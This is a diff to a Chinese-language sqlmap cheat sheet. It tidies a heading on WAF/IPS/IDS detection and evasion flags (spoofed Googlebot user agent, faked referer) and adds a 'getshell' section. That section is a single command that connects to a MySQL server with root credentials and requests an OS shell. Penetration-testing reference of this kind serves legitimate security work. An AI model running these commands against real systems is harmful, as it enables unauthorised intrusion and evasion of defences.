@@ -100,10 +100,15 @@ sqlmap -u URL --reg-add --reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap" --reg-val
 --eta                                           # 计算注入数据的剩余时间
 ```
 
-**测试WAF/IPS/IDS保护**
+**测试 WAF/IPS/IDS 保护**
 ```bash
 --identify-waf                                                      # 尝试找出WAF/IPS/IDS保护，方便用户做出绕过方式。
 --mobile                                                            # 模仿智能手机
 --referer "http://www.google.com"                                   # 模拟来源
 --user-agent "Googlebot/2.1(+http://www.googlebot.com/bot.html)"    # 模拟谷歌蜘蛛
+```
+
+**尝试 getshell**
+```bash
+sqlmap -d "mysql://root:root@192.168.1.1:3306/mysql" --os-shell
 ```
